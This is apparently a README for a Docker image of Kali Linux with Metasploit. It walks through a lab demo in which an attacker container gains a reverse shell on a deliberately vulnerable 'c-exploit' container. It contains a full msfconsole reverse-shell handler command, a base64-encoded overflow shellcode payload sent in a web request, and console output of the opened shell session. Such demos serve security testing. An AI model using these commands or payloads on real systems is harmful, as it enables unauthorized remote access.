# kali-metasploit
Containerized Kali Linux with Metasploit Framework installed. Repo is designed to install Polyverse custom modules.

## Build
```
pv build docker
```

## Usage
```
docker run -it polyverse/kali-metasploit msfconsole
```

## Example
You can use the `-x` switch with msfconsole and then specify all the msf commands you want to run in a single double-quoted argument.
```
docker run -it -p 5555:5555 polyverse-internal.jfrog.io/kali-metasploit msfconsole -x "use multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $(docker run -it -p 5555:5555 polyverse-internal.jfrog.io/kali-metasploit ifconfig eth0 | grep inet | awk '{print $2}'); set LPORT 5555; exploit"
```

### c-exploit.sh
In this example, an attacker container (`polyverse-internal.jfrog.io/kali-metasploit`) will get a reverse-shell from the victim container (`polyverse/c-exploit`).

1. In this repo, perform `pv build -r polyverse-internal.jfrog.io docker`. This will create the Docker container image `polyverse-internal.jfrog.io/kali-metasploit`.
2. `cd ..` to move up a folder and then `git clone https://github.com/polyverse-security/c-exploit.git`. If you've already cloned, just go to the folder and `git pull`.
3. `pv build docker` to create a new version of `polyverse/c-exploit`.
4. `cd ../kali-metasploit` to get back to the original folder.
5. In one terminal window, launch `docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit`
6. In another terminial window, run the `./c-exploit.sh` script. You can look at the script to see what it's doing, but it's basically calling the `kali-metasploit` container with sub-scripts to determine ip addresses; it also runs `msfconsole` with the `-x` option that allows you to specify all the arguments for the metasploit module in a single command line.

This is what you should see in the c-exploit window:

```
$ docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
AH00558: apache2: Could not reliably determine the server's fully qualified domain name, using 172.17.0.2. Set the 'ServerName' directive globally to suppress this message
[Tue Aug 15 07:16:40.745028 2017] [mpm_prefork:notice] [pid 1] AH00163: Apache/2.4.10 (Debian) PHP/7.1.8 configured -- resuming normal operations
[Tue Aug 15 07:16:40.745097 2017] [core:notice] [pid 1] AH00094: Command line: 'apache2 -D FOREGROUND'
172.17.0.1 - - [15/Aug/2017:07:17:01 +0000] "GET /index.php?q=YWFhYWFhYWFhYWFhYWFhYWEw5v///38AAGopWJlqAl9qAV4PBUiXSLkCABWzrBEAAlFIieZqEFpqKlgPBWoDXkj/zmohWA8FdfZqO1iZSLsvYmluL3NoAFNIiedSV0iJ5g8FYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYg== HTTP/1.1" 200 277 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)"
```

And this is what you should see in the kali-metasploit window:

```
$ ./c-exploit.sh 
                                                  
                                   ____________
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $a,        |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| $S`?a,     |%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%__%%%%%%%%%%|       `?a, |%%%%%%%%__%%%%%%%%%__%%__ %%%%]
 [% .--------..-----.|  |_ .---.-.|       .,a$%|.-----.|  |.-----.|__||  |_ %%]
 [% |        ||  -__||   _||  _  ||  ,,aS$""`  ||  _  ||  ||  _  ||  ||   _|%%]
 [% |__|__|__||_____||____||___._||%$P"`       ||   __||__||_____||__||____|%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%| `"a,       ||__|%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%|____`"a,$$__|%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%        `"$   %%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]
 [%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%]


       =[ metasploit v4.15.5-dev                          ]
+ -- --=[ 1675 exploits - 959 auxiliary - 294 post        ]
+ -- --=[ 489 payloads - 40 encoders - 9 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

RHOST => 192.168.0.15
RPORT => 8080
payload => linux/x64/shell_reverse_tcp
LHOST => 172.17.0.2
LPORT => 5555
[*] Started reverse TCP handler on 172.17.0.2:5555 
[*] start exploit...
[*] address of rsp w/ offset = 7fffffffe630
[*] base64-encoded payload: YWFhYWFhYWFhYWFhYWFhYWEw5v///38AAGopWJlqAl9qAV4PBUiXSLkCABWzrBEAAlFIieZqEFpqKlgPBWoDXkj/zmohWA8FdfZqO1iZSLsvYmluL3NoAFNIiedSV0iJ5g8FYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYg== (Length: 500)
[*] Command shell session 7 opened (172.17.0.2:5555 -> 172.17.0.3:42242) at 2017-08-16 07:01:56 +0000
[*] done exploit.... 
```

At this point, you should have a reverse shell in the kali-metasploit window into the c-exploit container.
